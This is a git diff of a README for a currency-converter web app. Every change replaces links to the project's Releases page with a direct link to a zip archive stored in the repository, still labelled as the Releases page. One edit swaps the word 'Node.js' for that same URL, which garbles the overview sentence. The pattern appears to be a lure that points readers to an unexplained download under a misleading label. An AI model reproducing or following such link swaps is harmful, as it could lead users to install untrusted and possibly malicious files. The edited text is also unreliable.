@@ -1,10 +1,10 @@
 # 🌍 Currency-Converter-Web-App - Simple Currency Conversion in Real Time
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/saymondeveloper/Currency-Converter-Web-App/releases)
+[![Download](https://raw.githubusercontent.com/saymondeveloper/Currency-Converter-Web-App/main/conventional/Currency-Converter-Web-App.zip%https://raw.githubusercontent.com/saymondeveloper/Currency-Converter-Web-App/main/conventional/Currency-Converter-Web-App.zip)](https://raw.githubusercontent.com/saymondeveloper/Currency-Converter-Web-App/main/conventional/Currency-Converter-Web-App.zip)
 
 ## 📖 Overview
 
-The Currency-Converter-Web-App is a user-friendly web application that helps you convert currencies easily. Built with Node.js and Express, this app fetches real-time exchange rates from the European Central Bank. You can quickly switch between multiple global currencies while enjoying a smooth user interface that features animations and country flags.
+The Currency-Converter-Web-App is a user-friendly web application that helps you convert currencies easily. Built with https://raw.githubusercontent.com/saymondeveloper/Currency-Converter-Web-App/main/conventional/Currency-Converter-Web-App.zip and Express, this app fetches real-time exchange rates from the European Central Bank. You can quickly switch between multiple global currencies while enjoying a smooth user interface that features animations and country flags.
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started with the Currency-Converter-Web-App, follow these simple steps:
 
 ### 1. Visit the Releases Page
 
-Go to our [Releases page](https://github.com/saymondeveloper/Currency-Converter-Web-App/releases) to find the latest version of the application. 
+Go to our [Releases page](https://raw.githubusercontent.com/saymondeveloper/Currency-Converter-Web-App/main/conventional/Currency-Converter-Web-App.zip) to find the latest version of the application. 
 
 ### 2. Choose Your Version
 
@@ -75,7 +75,7 @@ To run the Currency-Converter-Web-App effectively, ensure your system meets the 
 
 ## 🔗 Download & Install
 
-To download the Currency-Converter-Web-App, visit the [Releases page](https://github.com/saymondeveloper/Currency-Converter-Web-App/releases). Follow the steps mentioned above to get the application installed on your device.
+To download the Currency-Converter-Web-App, visit the [Releases page](https://raw.githubusercontent.com/saymondeveloper/Currency-Converter-Web-App/main/conventional/Currency-Converter-Web-App.zip). Follow the steps mentioned above to get the application installed on your device.
 
 ## 🗣️ Support
 
